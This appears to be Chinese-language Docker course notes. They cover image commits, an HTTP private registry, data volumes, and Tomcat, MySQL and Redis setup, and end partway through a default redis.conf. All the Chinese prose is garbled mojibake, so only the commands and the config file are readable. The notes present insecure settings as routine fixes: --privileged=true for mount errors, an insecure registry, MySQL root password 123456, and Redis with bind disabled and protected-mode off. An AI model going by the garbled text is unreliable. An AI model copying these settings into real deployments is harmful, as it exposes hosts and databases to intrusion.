ä»Hubä¸Šä¸‹è½½ubuntué•œåƒåˆ°æœ¬åœ°å¹¶æˆåŠŸè¿è¡Œ åŸå§‹çš„Ubuntué•œåƒæ˜¯ä¸å¸¦ç€ifconfigå‘½ä»¤çš„ å¤–ç½‘è¿é€šçš„æƒ…å†µä¸‹ï¼Œå®‰è£…ifconfigå‘½ä»¤å¹¶æµ‹è¯•é€šè¿‡ dockerå®¹å™¨å†…æ‰§è¡Œä¸Šè¿°ä¸¤æ¡å‘½ä»¤ï¼š apt-get update apt-get install net-tools å®‰è£…å®Œæˆåï¼Œcommitæˆ‘ä»¬è‡ªå·±çš„æ–°é•œåƒ å…¬å¼ï¼š docker commit -m=\"æäº¤çš„æè¿°ä¿¡æ¯\" -a=\"ä½œè€…\" å®¹å™¨ID è¦åˆ›å»ºçš„ç›®æ ‡é•œåƒå:[æ ‡ç­¾å] å‘½ä»¤ï¼šåœ¨å®¹å™¨å¤–æ‰§è¡Œï¼Œè®°å¾— docker commit -m=\"ifconfig cmd add\" -a=\"zzyy\" a69d7c825c4f zzyyubuntu:1.2 å¯åŠ¨æˆ‘ä»¬çš„æ–°é•œåƒå¹¶å’ŒåŸæ¥çš„å¯¹æ¯” å®˜ç½‘æ˜¯é»˜è®¤ä¸‹è½½çš„Ubuntuæ²¡æœ‰ifconfigå‘½ä»¤ã€‚ æˆ‘ä»¬è‡ªå·±commitæ„å»ºçš„æ–°é•œåƒï¼Œæ–°å¢åŠ äº†ifconfigåŠŸèƒ½ï¼Œå¯ä»¥æˆåŠŸä½¿ç”¨ã€‚ 6.2.4 curléªŒè¯ç§æœåº“ä¸Šæœ‰ä»€ä¹ˆé•œåƒ curl -XGET http://192.168.111.162:5000/v2/_catalog å¯ä»¥çœ‹åˆ°ï¼Œç›®å‰ç§æœåº“æ²¡æœ‰ä»»ä½•é•œåƒä¸Šä¼ è¿‡ã€‚ 6.2.5 å°†æ–°é•œåƒzzyyubuntu:1.2ä¿®æ”¹ç¬¦åˆç§æœè§„èŒƒçš„Tag æŒ‰ç…§å…¬å¼ï¼š docker tag é•œåƒ:Tag Host:Port/Repository:Tag è‡ªå·±hostä¸»æœºIPåœ°å€ï¼Œå¡«å†™åŒå­¦ä½ ä»¬è‡ªå·±çš„ï¼Œä¸è¦ç²˜è´´é”™è¯¯ã€‚ ä½¿ç”¨å‘½ä»¤ docker tag å°†zzyyubuntu:1.2 è¿™ä¸ªé•œåƒä¿®æ”¹ä¸º192.168.111.162:5000/zzyyubuntu:1.2 docker tag zzyyubuntu:1.2 192.168.111.162:5000/zzyyubuntu:1.2 6.2.6 ä¿®æ”¹é…ç½®æ–‡ä»¶ä½¿ä¹‹æ”¯æŒhttp åˆ«æ— è„‘ç…§ç€å¤åˆ¶ï¼Œregistry-mirrors é…ç½®çš„æ˜¯å›½å†…é˜¿é‡Œæä¾›çš„é•œåƒåŠ é€Ÿåœ°å€ï¼Œä¸ç”¨åŠ é€Ÿçš„è¯è®¿é—®å®˜ç½‘çš„ä¼šå¾ˆæ…¢ã€‚ 2ä¸ªé…ç½®ä¸­é—´æœ‰ä¸ªé€—å· ','åˆ«æ¼äº†ï¼Œè¿™ä¸ªé…ç½®æ˜¯jsonæ ¼å¼çš„ã€‚ vimå‘½ä»¤æ–°å¢å¦‚ä¸‹çº¢è‰²å†…å®¹ï¼švim /etc/docker/daemon.json { â€œregistry-mirrorsâ€: [â€œhttps://aa25jngu.mirror.aliyuncs.comâ€], â€œinsecure-registriesâ€: [â€œ192.168.111.162:5000â€] } ä¸Šè¿°ç†ç”±ï¼šdockeré»˜è®¤ä¸å…è®¸httpæ–¹å¼æ¨é€é•œåƒï¼Œé€šè¿‡é…ç½®é€‰é¡¹æ¥å–æ¶ˆè¿™ä¸ªé™åˆ¶ã€‚====&gt; ä¿®æ”¹å®Œåå¦‚æœä¸ç”Ÿæ•ˆï¼Œå»ºè®®é‡å¯dockerã€‚ 6.2.7 pushæ¨é€åˆ°ç§æœåº“ docker push 192.168.111.162:5000/zzyyubuntu:1.2 6.2.8 curléªŒè¯ç§æœåº“ä¸Šæœ‰ä»€ä¹ˆé•œåƒ2 curl -XGET http://192.168.111.162:5000/v2/_catalog 6.2.9 pullåˆ°æœ¬åœ°å¹¶è¿è¡Œ docker pull 192.168.111.162:5000/zzyyubuntu:1.2 docker run -it é•œåƒID /bin/bash 7 Dockerå®¹å™¨æ•°æ®å· 7.1 å‘ï¼šå®¹å™¨å·è®°å¾—åŠ å…¥ --privileged=true DockeræŒ‚è½½ä¸»æœºç›®å½•è®¿é—®å¦‚æœå‡ºç°cannot open directory .: Permission denied è§£å†³åŠæ³•ï¼šåœ¨æŒ‚è½½ç›®å½•åå¤šåŠ ä¸€ä¸ªâ€“privileged=trueå‚æ•°å³å¯ å¦‚æœæ˜¯CentOS7å®‰å…¨æ¨¡å—ä¼šæ¯”ä¹‹å‰ç³»ç»Ÿç‰ˆæœ¬åŠ å¼ºï¼Œä¸å®‰å…¨çš„ä¼šå…ˆç¦æ­¢ï¼Œæ‰€ä»¥ç›®å½•æŒ‚è½½çš„æƒ…å†µè¢«é»˜è®¤ä¸ºä¸å®‰å…¨çš„è¡Œä¸ºï¼Œåœ¨SELinuxé‡Œé¢æŒ‚è½½ç›®å½•è¢«ç¦æ­¢æ‰äº†ï¼Œå¦‚æœè¦å¼€å¯ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨â€“privileged=trueå‘½ä»¤ï¼Œæ‰©å¤§å®¹å™¨çš„æƒé™è§£å†³æŒ‚è½½ç›®å½•æ²¡æœ‰æƒé™çš„é—®é¢˜ï¼Œä¹Ÿå³ä½¿ç”¨è¯¥å‚æ•°ï¼Œcontainerå†…çš„rootæ‹¥æœ‰çœŸæ­£çš„rootæƒé™ï¼Œå¦åˆ™ï¼Œcontainerå†…çš„rootåªæ˜¯å¤–éƒ¨çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™ã€‚ 7.2 å›é¡¾ä¸‹ä¸Šä¸€è®²çš„çŸ¥è¯†ç‚¹ï¼Œå‚æ•°V 7.3 æ˜¯ä»€ä¹ˆ å·å°±æ˜¯ç›®å½•æˆ–æ–‡ä»¶ï¼Œå­˜åœ¨äºä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ä¸­ï¼Œç”±dockeræŒ‚è½½åˆ°å®¹å™¨ï¼Œä½†ä¸å±äºè”åˆæ–‡ä»¶ç³»ç»Ÿï¼Œå› æ­¤èƒ½å¤Ÿç»•è¿‡Union File Systemæä¾›ä¸€äº›ç”¨äºæŒç»­å­˜å‚¨æˆ–å…±äº«æ•°æ®çš„ç‰¹æ€§ï¼šå·çš„è®¾è®¡ç›®çš„å°±æ˜¯æ•°æ®çš„æŒä¹…åŒ–ï¼Œå®Œå…¨ç‹¬ç«‹äºå®¹å™¨çš„ç”Ÿå­˜å‘¨æœŸï¼Œå› æ­¤Dockerä¸ä¼šåœ¨å®¹å™¨åˆ é™¤æ—¶åˆ é™¤å…¶æŒ‚è½½çš„æ•°æ®å·ã€‚ ä¸€å¥è¯ï¼šæœ‰ç‚¹ç±»ä¼¼æˆ‘ä»¬Redisé‡Œé¢çš„rdbå’Œaofæ–‡ä»¶ã€‚ å°†dockerå®¹å™¨å†…çš„æ•°æ®ä¿å­˜è¿›å®¿ä¸»æœºçš„ç£ç›˜ä¸­ï¼Œè¿è¡Œä¸€ä¸ªå¸¦æœ‰å®¹å™¨å·å­˜å‚¨åŠŸèƒ½çš„å®¹å™¨å®ä¾‹ã€‚ docker run -it --privileged=true -v /å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:/å®¹å™¨å†…ç›®å½• é•œåƒå 7.4 èƒ½å¹²å˜› å°†è¿ç”¨ä¸è¿è¡Œçš„ç¯å¢ƒæ‰“åŒ…é•œåƒï¼Œrunåå½¢æˆå®¹å™¨å®ä¾‹è¿è¡Œ ï¼Œä½†æ˜¯æˆ‘ä»¬å¯¹æ•°æ®çš„è¦æ±‚å¸Œæœ›æ˜¯æŒä¹…åŒ–çš„ã€‚ Dockerå®¹å™¨äº§ç”Ÿçš„æ•°æ®ï¼Œå¦‚æœä¸å¤‡ä»½ï¼Œé‚£ä¹ˆå½“å®¹å™¨å®ä¾‹åˆ é™¤åï¼Œå®¹å™¨å†…çš„æ•°æ®è‡ªç„¶ä¹Ÿå°±æ²¡æœ‰äº†ã€‚ä¸ºäº†èƒ½ä¿å­˜æ•°æ®åœ¨dockerä¸­æˆ‘ä»¬ä½¿ç”¨å·ã€‚ ç‰¹ç‚¹ï¼š æ•°æ®å·å¯åœ¨å®¹å™¨ä¹‹é—´å…±äº«æˆ–é‡ç”¨æ•°æ® å·ä¸­çš„æ›´æ”¹å¯ä»¥ç›´æ¥å®æ—¶ç”Ÿæ•ˆï¼Œçˆ½ æ•°æ®å·ä¸­çš„æ›´æ”¹ä¸ä¼šåŒ…å«åœ¨é•œåƒçš„æ›´æ–°ä¸­ æ•°æ®å·çš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´æŒç»­åˆ°æ²¡æœ‰å®¹å™¨ä½¿ç”¨å®ƒä¸ºæ­¢ 7.5 æ•°æ®å·æ¡ˆä¾‹ 7.5.1 å®¿ä¸»vså®¹å™¨ä¹‹é—´æ˜ å°„æ·»åŠ å®¹å™¨å· ç›´æ¥å‘½ä»¤æ·»åŠ  docker run -it --privileged=true -v /å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:/å®¹å™¨å†…ç›®å½• é•œåƒå å…¬å¼ï¼šdocker run -it -v /å®¿ä¸»æœºç›®å½•:/å®¹å™¨å†…ç›®å½• ubuntu /bin/bash docker run -it --name myu3 --privileged=true -v /tmp/myHostData:/tmp/myDockerData ubuntu /bin/bash æŸ¥çœ‹æ•°æ®å·æ˜¯å¦æŒ‚è½½æˆåŠŸ docker inspect å®¹å™¨ID å®¹å™¨å’Œå®¿ä¸»æœºä¹‹é—´æ•°æ®å…±äº« dockerä¿®æ”¹ï¼Œä¸»æœºåŒæ­¥è·å¾— ã€‚ ä¸»æœºä¿®æ”¹ï¼ŒdockeråŒæ­¥è·å¾—ã€‚ dockerå®¹å™¨stopï¼Œä¸»æœºä¿®æ”¹ï¼Œdockerå®¹å™¨é‡å¯çœ‹æ•°æ®æ˜¯å¦åŒæ­¥ã€‚ 7.5.2 è¯»å†™è§„åˆ™æ˜ å°„æ·»åŠ è¯´æ˜ è¯»å†™(é»˜è®¤) docker run -it --privileged=true -v /å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:/å®¹å™¨å†…ç›®å½•:rw é•œåƒå é»˜è®¤åŒä¸Šæ¡ˆä¾‹ï¼Œé»˜è®¤å°±æ˜¯rw rw = read + write åªè¯» å®¹å™¨å®ä¾‹å†…éƒ¨è¢«é™åˆ¶ï¼Œåªèƒ½è¯»å–ä¸èƒ½å†™ /å®¹å™¨ç›®å½•:ro é•œåƒå å°±èƒ½å®ŒæˆåŠŸèƒ½ï¼Œæ­¤æ—¶å®¹å™¨è‡ªå·±åªèƒ½è¯»å–ä¸èƒ½å†™ ro = read only æ­¤æ—¶å¦‚æœå®¿ä¸»æœºå†™å…¥å†…å®¹ï¼Œå¯ä»¥åŒæ­¥ç»™å®¹å™¨å†…ï¼Œå®¹å™¨å¯ä»¥è¯»å–åˆ°ã€‚ docker run -it --privileged=true -v /å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:/å®¹å™¨å†…ç›®å½•:ro é•œåƒå 7.5.3 å·çš„ç»§æ‰¿å’Œå…±äº« å®¹å™¨1å®Œæˆå’Œå®¿ä¸»æœºçš„æ˜ å°„ docker run -it --privileged=true -v /mydocker/u:/tmp --name u1 ubuntu å®¹å™¨2ç»§æ‰¿å®¹å™¨1çš„å·è§„åˆ™ docker run -it --privileged=true --volumes-from çˆ¶ç±» --name u2 ubuntu 8 Dockerå¸¸è§„å®‰è£…ç®€ä»‹ 8.1 æ€»ä½“æ­¥éª¤ æœç´¢é•œåƒ æ‹‰å–é•œåƒ æŸ¥çœ‹é•œåƒ å¯åŠ¨é•œåƒ - æœåŠ¡ç«¯å£æ˜ å°„ åœæ­¢å®¹å™¨ ç§»é™¤å®¹å™¨ 8.2 å®‰è£…tomcat docker hubä¸Šé¢æŸ¥æ‰¾tomcaté•œåƒ docker search tomcat ä»docker hubä¸Šæ‹‰å–tomcaté•œåƒåˆ°æœ¬åœ° docker pull tomcat docker imagesæŸ¥çœ‹æ˜¯å¦æœ‰æ‹‰å–åˆ°çš„tomcat ä½¿ç”¨tomcaté•œåƒåˆ›å»ºå®¹å™¨å®ä¾‹(ä¹Ÿå«è¿è¡Œé•œåƒ) docker run -it -p 8080:8080 tomcat -p å°å†™ï¼Œä¸»æœºç«¯å£:dockerå®¹å™¨ç«¯å£ -P å¤§å†™ï¼Œéšæœºåˆ†é…ç«¯å£ -i äº¤äº’ -t ç»ˆç«¯ -d åå° è®¿é—®çŒ«é¦–é¡µ é—®é¢˜ è§£å†³ å¯èƒ½æ²¡æœ‰æ˜ å°„ç«¯å£æˆ–è€…æ²¡æœ‰å…³é—­é˜²ç«å¢™ æŠŠwebapps.distç›®å½•æ¢æˆwebapps å…ˆæˆåŠŸå¯åŠ¨tomcat æŸ¥çœ‹webapps æ–‡ä»¶å¤¹æŸ¥çœ‹ä¸ºç©º å…ä¿®æ”¹ç‰ˆè¯´æ˜ docker pull billygoo/tomcat8-jdk8 docker run -d -p 8080:8080 --name mytomcat8 billygoo/tomcat8-jdk8 8.3 å®‰è£…mysql 8.3.1 docker hubä¸Šé¢æŸ¥æ‰¾mysqlé•œåƒ 8.3.2 ä»docker hubä¸Š(é˜¿é‡Œäº‘åŠ é€Ÿå™¨)æ‹‰å–mysqlé•œåƒåˆ°æœ¬åœ°æ ‡ç­¾ä¸º5.7 8.3.3 ä½¿ç”¨mysql5.7é•œåƒåˆ›å»ºå®¹å™¨(ä¹Ÿå«è¿è¡Œé•œåƒ) 8.3.3.1 å‘½ä»¤å‡ºå¤„ï¼Œå“ªé‡Œæ¥çš„ï¼Ÿ 8.3.3.2 ç®€å•ç‰ˆ ä½¿ç”¨mysqlé•œåƒ docker run -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 docker ps docker exec -it å®¹å™¨ID /bin/bash mysql -uroot -p å»ºåº“å»ºè¡¨æ’å…¥æ•°æ® å¤–éƒ¨Win10ä¹Ÿæ¥è¿æ¥è¿è¡Œåœ¨dokcerä¸Šçš„mysqlå®¹å™¨å®ä¾‹æœåŠ¡ é—®é¢˜ æ’å…¥ä¸­æ–‡æ•°æ®è¯•è¯• ä¸ºä»€ä¹ˆæŠ¥é”™? dockerä¸Šé»˜è®¤å­—ç¬¦é›†ç¼–ç éšæ‚£,dockeré‡Œé¢çš„mysqlå®¹å™¨å®ä¾‹æŸ¥çœ‹ï¼Œå†…å®¹å¦‚ä¸‹ï¼š SHOW VARIABLES LIKE 'character%' åˆ é™¤å®¹å™¨åï¼Œé‡Œé¢çš„mysqlæ•°æ®æ€ä¹ˆåŠï¼Ÿ 8.3.3.3 å®æˆ˜ç‰ˆ æ–°å»ºmysqlå®¹å™¨å®ä¾‹ docker run -d -p 3306:3306 --privileged=true -v /bcxuse/mysql/log:/var/log/mysql -v /bcxuse/mysql/data:/var/lib/mysql -v /bcxuse/mysql/conf:/etc/mysql/conf.d -eMYSQL_ROOT_PASSWORD=123456 --name mysql mysql:5.7 æ–°å»ºmy.cnfï¼Œé€šè¿‡å®¹å™¨å·åŒæ­¥ç»™mysqlå®¹å™¨å®ä¾‹ [client] default_character_set=utf8 [mysqld] collation_server = utf8_general_ci character_set_server = utf8 é‡æ–°å¯åŠ¨mysqlå®¹å™¨å®ä¾‹å†é‡æ–°è¿›å…¥å¹¶æŸ¥çœ‹å­—ç¬¦ç¼–ç  å†æ–°å»ºåº“æ–°å»ºè¡¨å†æ’å…¥ä¸­æ–‡æµ‹è¯• ç»“è®º ä¹‹å‰çš„DB æ— æ•ˆï¼Œä¿®æ”¹å­—ç¬¦é›†æ“ä½œ+é‡å¯mysqlå®¹å™¨å®ä¾‹ ä¹‹åçš„DB æœ‰æ•ˆï¼Œéœ€è¦æ–°å»º ç»“è®ºï¼šdockerå®‰è£…å®ŒMySQLå¹¶runå‡ºå®¹å™¨åï¼Œå»ºè®®è¯·å…ˆä¿®æ”¹å®Œå­—ç¬¦é›†ç¼–ç åå†æ–°å»ºmysqlåº“-è¡¨-æ’æ•°æ® å‡å¦‚å°†å½“å‰å®¹å™¨å®ä¾‹åˆ é™¤ï¼Œå†é‡æ–°æ¥ä¸€æ¬¡ï¼Œä¹‹å‰å»ºçš„db01å®ä¾‹è¿˜æœ‰å—ï¼Ÿtry 8.4 å®‰è£…redis ä»docker hubä¸Š(é˜¿é‡Œäº‘åŠ é€Ÿå™¨)æ‹‰å–redisé•œåƒåˆ°æœ¬åœ°æ ‡ç­¾ä¸º6.0.8 å…¥é—¨å‘½ä»¤ å‘½ä»¤æé†’ï¼šå®¹å™¨å·è®°å¾—åŠ å…¥â€“privileged=true DockeræŒ‚è½½ä¸»æœºç›®å½•Dockerè®¿é—®å‡ºç°cannot open directory .: Permission denied è§£å†³åŠæ³•ï¼šåœ¨æŒ‚è½½ç›®å½•åå¤šåŠ ä¸€ä¸ªâ€“privileged=trueå‚æ•°å³å¯ åœ¨CentOSå®¿ä¸»æœºä¸‹æ–°å»ºç›®å½•/app/redis mkdir -p /app/redis å°†ä¸€ä¸ªredis.confæ–‡ä»¶æ¨¡æ¿æ‹·è´è¿›/app/redisç›®å½•ä¸‹ å°†å‡†å¤‡å¥½çš„redis.confæ–‡ä»¶æ”¾è¿›/app/redisç›®å½•ä¸‹ /app/redisç›®å½•ä¸‹ä¿®æ”¹redis.confæ–‡ä»¶ é»˜è®¤å‡ºå‚çš„åŸå§‹redis.conf # Redis configuration file example. # # Note that in order to read the configuration file, Redis must be # started with the file path as first argument: # # ./redis-server /path/to/redis.conf # Note on units: when memory size is needed, it is possible to specify # it in the usual form of 1k 5GB 4M and so forth: # # 1k =&gt; 1000 bytes # 1kb =&gt; 1024 bytes # 1m =&gt; 1000000 bytes # 1mb =&gt; 1024*1024 bytes # 1g =&gt; 1000000000 bytes # 1gb =&gt; 1024*1024*1024 bytes # # units are case insensitive so 1GB 1Gb 1gB are all the same. ################################## INCLUDES ################################### # Include one or more other config files here. This is useful if you # have a standard template that goes to all Redis servers but also need # to customize a few per-server settings. Include files can include # other files, so use this wisely. # # Notice option \"include\" won't be rewritten by command \"CONFIG REWRITE\" # from admin or Redis Sentinel. Since Redis always uses the last processed # line as value of a configuration directive, you'd better put includes # at the beginning of this file to avoid overwriting config change at runtime. # # If instead you are interested in using includes to override configuration # options, it is better to use include as the last line. # # include /path/to/local.conf # include /path/to/other.conf ################################## MODULES ##################################### # Load modules at startup. If the server is not able to load modules # it will abort. It is possible to use multiple loadmodule directives. # # loadmodule /path/to/my_module.so # loadmodule /path/to/other_module.so ################################## NETWORK ##################################### # By default, if no \"bind\" configuration directive is specified, Redis listens # for connections from all the network interfaces available on the server. # It is possible to listen to just one or multiple selected interfaces using # the \"bind\" configuration directive, followed by one or more IP addresses. # # Examples: # # bind 192.168.1.100 10.0.0.1 # bind 127.0.0.1 ::1 # # ~~~ WARNING ~~~ If the computer running Redis is directly exposed to the # internet, binding to all the interfaces is dangerous and will expose the # instance to everybody on the internet. So by default we uncomment the # following bind directive, that will force Redis to listen only into # the IPv4 loopback interface address (this means Redis will be able to # accept connections only from clients running into the same computer it # is running). # # IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES # JUST COMMENT THE FOLLOWING LINE. # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #bind 127.0.0.1 # Protected mode is a layer of security protection, in order to avoid that # Redis instances left open on the internet are accessed and exploited. # # When protected mode is on and if: # # 1) The server is not binding explicitly to a set of addresses using the # \"bind\" directive. # 2) No password is configured. # # The server only accepts connections from clients connecting from the # IPv4 and IPv6 loopback addresses 127.0.0.1 and ::1, and from Unix domain # sockets. # # By default protected mode is enabled. You should disable it only if # you are sure you want clients from other hosts to connect to Redis # even if no authentication is configured, nor a specific set of interfaces # are explicitly listed using the \"bind\" directive. protected-mode no # Accept connections on the specified port, default is 6379 (IANA #815344). # If port 0 is specified Redis will not listen on a TCP socket. port 6379 # TCP listen() backlog. # # In high requests-per-second environments you need an high backlog in order # to avoid slow clients connections issues. Note that the Linux kernel # will silently truncate it to the value of /proc/sys/net/core/somaxconn so # make sure to raise both the value of somaxconn and tcp_max_syn_backlog # in order to get the desired effect. tcp-backlog 511 # Unix socket. # # Specify the path for the Unix socket that will be used to listen for # incoming connections. There is no default, so Redis will not listen # on a unix socket when not specified. # # unixsocket /tmp/redis.sock # unixsocketperm 700 # Close the connection after a client is idle for N seconds (0 to disable) timeout 0 # TCP keepalive. # # If non-zero, use SO_KEEPALIVE to send TCP ACKs to clients in absence # of communication. This is useful for two reasons: # # 1) Detect dead peers. # 2) Take the connection alive from the point of view of network # equipment in the middle. # # On Linux, the specified value (in seconds) is the period used to send ACKs. # Note that to close the connection the double of the time is needed. # On other kernels the period depends on the kernel configuration. # # A reasonable value for this option is 300 seconds, which is the new # Redis default starting with Redis 3.2.1. tcp-keepalive 300 ################################# GENERAL ##################################### # By default Redis does not run as a daemon. Use 'yes' if you need it. # Note that Redis will write a pid file in /var/run/redis.pid when daemonized. daemonize no # If you run Redis from upstart or systemd, Redis can interact with your # supervision tree. Options: # supervised no - no supervision interaction # supervised upstart - signal upstart by putting Redis into SIGSTOP mode # supervised systemd - signal systemd by writing READY=1 to $NOTIFY_SOCKET # supervised auto - detect upstart or systemd method based on # UPSTART_JOB or NOTIFY_SOCKET environment variables # Note: these supervision methods only signal \"process is ready.\" # They do not enable continuous liveness pings back to your supervisor. supervised no # If a pid file is specified, Redis writes it where specified at startup # and removes it at exit. # # When the server runs non daemonized, no pid file is created if none is # specified in the configuration. When the server is daemonized, the pid file # is used even if not specified, defaulting to \"/var/run/redis.pid\". # # Creating a pid file is best effort: if Redis is not able to create it # nothing bad happens, the server will start and run normally. pidfile /var/run/redis_6379.pid # Specify the server verbosity level. # This can be one of: # debug (a lot of information, useful for development/testing) # verbose (many rarely useful info, but not a mess like the debug level) # notice (moderately verbose, what you want in production probably) # warning (only very important / critical messages are logged) loglevel notice # Specify the log file name. Also the empty string can be used to force # Redis to log on the standard output. Note that if you use standard # output for logging but daemonize, logs will be sent to /dev/null logfile \"\" # To enable logging to the system logger, just set 'syslog-enabled' to yes, # and optionally update the other syslog parameters to suit your needs. # syslog-enabled no # Specify the syslog identity. # syslog-ident redis # Specify the syslog facility. Must be USER or between LOCAL0-LOCAL7. # syslog-facility local0 # Set the number of databases. The default database is DB 0, you can select # a different one on a per-connection basis using SELECT &lt;dbid&gt; where # dbid is a number between 0 and 'databases'-1 databases 16 # By default Redis shows an ASCII art logo only when started to log to the # standard output and if the standard output is a TTY. Basically this means # that normally a logo is displayed only in interactive sessions. # # However it is possible to force the pre-4.0 behavior and always show a # ASCII art logo in startup logs by setting the following option to yes. always-show-logo yes ################################ SNAPSHOTTING ################################ # # Save the DB on disk: # # save &lt;seconds&gt; &lt;changes&gt; # # Will save the DB if both the given number of seconds and the given # number of write operations against the DB occurred. # # In the example below the behaviour will be to save: # after 900 sec (15 min) if at least 1 key changed # after 300 sec (5 min) if at least 10 keys changed # after 60 sec if at least 10000 keys changed # # Note: you can disable saving completely by commenting out all \"save\" lines. # # It is also possible to remove all the previously configured save # points by adding a save directive with a single empty string argument # like in the following example: # # save \"\" save 900 1 save 300 10 save 60 10000 # By default Redis will stop accepting writes if RDB snapshots are enabled # (at least one save point) and the latest background save failed. # This will make the user aware (in a hard way) that data is not persisting # on disk properly, otherwise chances are that no one will notice and some # disaster will happen. # # If the background saving process will start working again Redis will # automatically allow writes again. # # However if you have setup your proper monitoring of the Redis server # and persistence, you may want to disable this feature so that Redis will # continue to work as usual even if there are problems with disk, # permissions, and so forth. stop-writes-on-bgsave-error yes # Compress string objects using LZF when dump .rdb databases? # For default that's set to 'yes' as it's almost always a win. # If you want to save some CPU in the saving child set it to 'no' but # the dataset will likely be bigger if you have compressible values or keys. rdbcompression yes # Since version 5 of RDB a CRC64 checksum is placed at the end of the file. # This makes the format more resistant to corruption but there is a performance # hit to pay (around 10%) when saving and loading RDB files, so you can disable it # for maximum performances. # # RDB files created with checksum disabled have a checksum of zero that will # tell the loading code to skip the check. rdbchecksum yes # The filename where to dump the DB dbfilename dump.rdb # The working directory. # # The DB will be written inside this directory, with the filename specified # above using the 'dbfilename' configuration directive. # # The Append Only File will also be created inside this directory. # # Note that you must specify a directory here, not a file name. dir ./ ################################# REPLICATION ################################# # Master-Replica replication. Use replicaof to make a Redis instance a copy of # another Redis server. A few things to understand ASAP about Redis replication. # # +------------------+ +---------------+ # | Master | ---&gt; | Replica | # | (receive writes) | | (exact copy) | # +------------------+ +---------------+ # # 1) Redis replication is asynchronous, but you can configure a master to # stop accepting writes if it appears to be not connected with at least # a given number of replicas. # 2) Redis replicas are able to perform a partial resynchronization with the # master if the replication link is lost for a relatively small amount of # time. You may want to configure the replication backlog size (see the next # sections of this file) with a sensible value depending on your needs. # 3) Replication is automatic and does not need user intervention. After a # network partition replicas automatically try to reconnect to masters # and resynchronize with them. # # replicaof &lt;masterip&gt; &lt;masterport&gt; # If the master is password protected (using the \"requirepass\" configuration # directive below) it is possible to tell the replica to authenticate before # starting the replication synchronization process, otherwise the master will # refuse the replica request. # # masterauth &lt;master-password&gt; # When a replica loses its connection with the master, or when the replication # is still in progress, the replica can act in two different ways: # # 1) if replica-serve-stale-data is set to 'yes' (the default) the replica will # still reply to client requests, possibly with out of date data, or the # data set may just be empty if this is the first synchronization. # # 2) if replica-serve-stale-data is set to 'no' the replica will reply with # an error \"SYNC with master in progress\" to all the kind of commands # but to INFO, replicaOF, AUTH, PING, SHUTDOWN, REPLCONF, ROLE, CONFIG, # SUBSCRIBE, UNSUBSCRIBE, PSUBSCRIBE, PUNSUBSCRIBE, PUBLISH, PUBSUB, # COMMAND, POST, HOST: and LATENCY. # replica-serve-stale-data yes # You can configure a replica instance to accept writes or not. Writing against # a replica instance may be useful to store some ephemeral data (because data # written on a replica will be easily deleted after resync with the master) but # may also cause problems if clients are writing to it because of a # misconfiguration. # # Since Redis 2.6 by default replicas are read-only. # # Note: read only replicas are not designed to be exposed to untrusted clients # on the internet. It's just a protection layer against misuse of the instance. # Still a read only replica exports by default all the administrative commands # such as CONFIG, DEBUG, and so forth. To a limited extent you can improve # security of read only replicas using 'rename-command' to shadow all the # administrative / dangerous commands. replica-read-only yes # Replication SYNC strategy: disk or socket. # # ------------------------------------------------------- # WARNING: DISKLESS REPLICATION IS EXPERIMENTAL CURRENTLY # ------------------------------------------------------- # # New replicas and reconnecting replicas that are not able to continue the replication # process just receiving differences, need to do what is called a \"full # synchronization\". An RDB file is transmitted from the master to the replicas. # The transmission can happen in two different ways: # # 1) Disk-backed: The Redis master creates a new process that writes the RDB # file on disk. Later the file is transferred by the parent # process to the replicas incrementally. # 2) Diskless: The Redis master creates a new process that directly writes the # RDB file to replica sockets, without touching the disk at all. # # With disk-backed replication, while the RDB file is generated, more replicas # can be queued and served with the RDB file as soon as the current child producing # the RDB file finishes its work. With diskless replication instead once # the transfer starts, new replicas arriving will be queued and a new transfer # will start when the current one terminates. # # When diskless replication is used, the master waits a configurable amount of # time (in seconds) before starting the transfer in the hope that multiple replicas # will arrive and the transfer can be parallelized. # # With slow disks and fast (large bandwidth) networks, diskless replication # works better. repl-diskless-sync no # When diskless replication is enabled, it is possible to configure the delay # the server waits in order to spawn the child that transfers the RDB via socket # to the replicas. # # This is important since once the transfer starts, it is not possible to serve # new replicas arriving, that will be queued for the next RDB transfer, so the server # waits a delay in order to let more replicas arrive. # # The delay is specified in seconds, and by default is 5 seconds. To disable # it entirely just set it to 0 seconds and the transfer will start ASAP. repl-diskless-sync-delay 5 # Replicas send PINGs to server in a predefined interval. It's possible to change # this interval with the repl_ping_replica_period option. The default value is 10 # seconds. # # repl-ping-replica-period 10 # The following option sets the replication timeout for: # # 1) Bulk transfer I/O during SYNC, from the point of view of replica. # 2) Master timeout from the point of view of replicas (data, pings). # 3) Replica timeout from the point of view of masters (REPLCONF ACK pings). # # It is important to make sure that this value is greater than the value # specified for repl-ping-replica-period otherwise a timeout will be detected # every time there is low traffic between the master and the replica. # # repl-timeout 60 # Disable TCP_NODELAY on the replica socket after SYNC? # # If you select \"yes\" Redis will use a smaller number of TCP packets and # less bandwidth to send data to replicas. But this can add a delay for # the data to appear on the replica side, up to 40 milliseconds with # Linux kernels using a default configuration. # # If you select \"no\" the delay for data to appear on the replica side will # be reduced but more bandwidth will be used for replication. # # By default we optimize for low latency, but in very high traffic conditions # or when the master and replicas are many hops away, turning this to \"yes\" may # be a good idea. repl-disable-tcp-nodelay no # Set the replication backlog size. The backlog is a buffer that accumulates # replica data when replicas are disconnected for some time, so that when a replica # wants to reconnect again, often a full resync is not needed, but a partial # resync is enough, just passing the portion of data the replica missed while # disconnected. # # The bigger the replication backlog, the longer the time the replica can be # disconnected and later be able to perform a partial resynchronization. # # The backlog is only allocated once there is at least a replica connected. # # repl-backlog-size 1mb # After a master has no longer connected replicas for some time, the backlog # will be freed. The following option configures the amount of seconds that # need to elapse, starting from the time the last replica disconnected, for # the backlog buffer to be freed. # # Note that replicas never free the backlog for timeout, since they may be # promoted to masters later, and should be able to correctly \"partially # resynchronize\" with the replicas: hence they should always accumulate backlog. # # A value of 